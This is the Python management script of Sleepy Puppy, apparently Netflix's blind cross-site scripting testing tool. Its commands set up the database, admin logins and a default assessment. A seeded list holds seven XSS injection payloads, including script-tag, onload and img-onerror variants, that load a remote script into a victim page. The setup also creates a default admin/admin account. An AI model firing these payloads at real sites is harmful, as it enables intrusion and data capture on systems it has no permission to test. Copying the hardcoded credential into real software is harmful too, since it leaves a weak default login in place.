#!/usr/bin/env python
#     Copyright 2015 Netflix, Inc.
#
#     Licensed under the Apache License, Version 2.0 (the "License");
#     you may not use this file except in compliance with the License.
#     You may obtain a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#     Unless required by applicable law or agreed to in writing, software
#     distributed under the License is distributed on an "AS IS" BASIS,
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#     See the License for the specific language governing permissions and
#     limitations under the License.
import getpass
import os

from flask_script.commands import ShowUrls, Clean
from flask.ext.script import Manager
from flask.ext.migrate import Migrate, MigrateCommand
from sleepypuppy.admin.admin.models import Administrator
from sleepypuppy import app, db
from js_strings import default_script, alert_box, console_log, default_without_screenshot, generic_collector

manager = Manager(app)
migrate = Migrate(app, db)
manager.add_command('db', MigrateCommand)


@manager.shell
def make_shell_context():
    """
    Creates a python REPL with several default imports
    in the context of the app
    """
    return dict(app=app)


@manager.command
def create_db():
    """
    Creates a database with all of the tables defined in
    your Alchemy models
    """
    db.create_all()


@manager.command
def drop_db():
    """
    Drops a database with all of the tables defined in
    your Alchemy models
    """
    db.drop_all()


@manager.command
def create_login(login):
    """
    Seed the database with an admin user.
    """

    print 'creating admin user'

    if Administrator.query.filter_by(login=login).count():
        print 'user already exists!'
        return

    # Check env for credentials (used by docker)
    docker_admin_pass = os.getenv('DOCKER_ADMIN_PASS', None)
    if docker_admin_pass:
        admin_user = Administrator(login=login, password=docker_admin_pass)
    else:
        # else, ask on stdin:
        while True:
            print "{}, enter your password!\n ".format(login)
            pw1 = getpass.getpass()
            pw2 = getpass.getpass(prompt="Confirm: ")

            if pw1 == pw2:
                admin_user = Administrator(login=login, password=pw1)
                break
            else:
                print 'passwords do not match!'

    db.session.add(admin_user)
    db.session.commit()
    print 'user: ' + login + ' created!'


@manager.command
def default_login():
    """
    Seed the database with some inital values
    """
    existing_admin = Administrator.query.filter(
        Administrator.login == 'admin').first()
    if existing_admin:
        print "Admin account (admin) already exists, skipping."
    else:
        admin_user = Administrator(login='admin', password='admin')
        print 'user: ' + 'admin' + ' created!'
        db.session.add(admin_user)
        db.session.commit()
        return


from collections import namedtuple
DefaultPayload = namedtuple(
    'DefaultPayload', ['payload', 'notes', 'snooze', 'run_once'])
DEFAULT_PAYLOADS = [
    DefaultPayload('<script src=$1></script>', None, False, False),
    DefaultPayload('</script><script src=$1>', None, False, False),
    DefaultPayload(
        '&lt;script src=$1&gt;&lt;/script&gt;', None, False, False),
    DefaultPayload('&lt;/script&gt;&lt;script src=$1&gt;',
                   None, False, False),
    DefaultPayload('''" onload="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);" garbage="''', None, False, False),  # noqa
    DefaultPayload("""'"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, False, False),  # noqa
    DefaultPayload("""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 '"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, False, False)  # noqa
]

DefaultPuppyscript = namedtuple('DefaultPuppyscript', ['name', 'code', 'notes'])

DEFAULT_JAVASCRIPTS = [
    DefaultPuppyscript('Default', default_script,
                      'Default  collects metadata for capture table including a screenshot'),
    DefaultPuppyscript('Default Without Screenshot', default_without_screenshot,
                      'Generating a screenshot can be CPU intensive and even in some cases cause browser instability, so for some assessments this may be a better option. '),
    DefaultPuppyscript(
        'Alert Box', alert_box, 'Generates an alert box for notification purposes'),
    DefaultPuppyscript(
        'Console Log', console_log, 'Log a message in the browser\'s console'),
    DefaultPuppyscript('Generic Collector: IP Address', generic_collector,
                      'Example showing how you can create generic JavaScripts for collecting any text data you choose.  In this example we use ajax to determine IP address and record the value. ')
]


@manager.command
def create_bootstrap_assessment(name="General", add_default_payloads=True):
    """
    Creates an assessment and attaches a few default payloads.
    """
    from sleepypuppy.admin.assessment.models import Assessment
    from sleepypuppy.admin.payload.models import Payload
    from sleepypuppy.admin.puppyscript.models import Puppyscript

    assessment = Assessment.query.filter(Assessment.name == name).first()
    if assessment:
        print("Assessment with name", name, "already exists, exiting.")
        return
    else:
        assessment = Assessment(
            name=name, access_log_enabled=False, snooze=False, run_once=False)
        # add assessment
        db.session.add(assessment)
        db.session.commit()

    existing_payload = Payload.query.filter(Payload.id == 1).first()

    if existing_payload:
        print("Payloads already exists, exiting.")
    else:
        if add_default_payloads:
            for payload in DEFAULT_PAYLOADS:
                payload = Payload(
                    payload=payload.payload,
                    notes=payload.notes,
                    ordering=u'1'
                )
                db.session.add(payload)
                db.session.commit()

    existing_puppyscript = Puppyscript.query.filter(Puppyscript.id == 1).first()

    if existing_puppyscript:
        print("Puppyscripts already exists, exiting.")
    else:
        for puppyscript in DEFAULT_JAVASCRIPTS:
            puppyscript = Puppyscript(
                name=puppyscript.name,
                code=puppyscript.code,
                notes=puppyscript.notes
            )
            db.session.add(puppyscript)
        db.session.commit()


@manager.command
def setup_sleepy_puppy():
    create_db()
    create_bootstrap_assessment()
    create_login('admin')


@manager.command
def list_routes():
    func_list = {}
    for rule in app.url_map.iter_rules():
        if rule.endpoint != 'static':
            func_list[rule.rule] = app.view_functions[rule.endpoint].__doc__

    from pprint import pprint
    pprint(func_list)

if __name__ == "__main__":
    manager.add_command("clean", Clean())
    manager.add_command("show_urls", ShowUrls())

    manager.run()
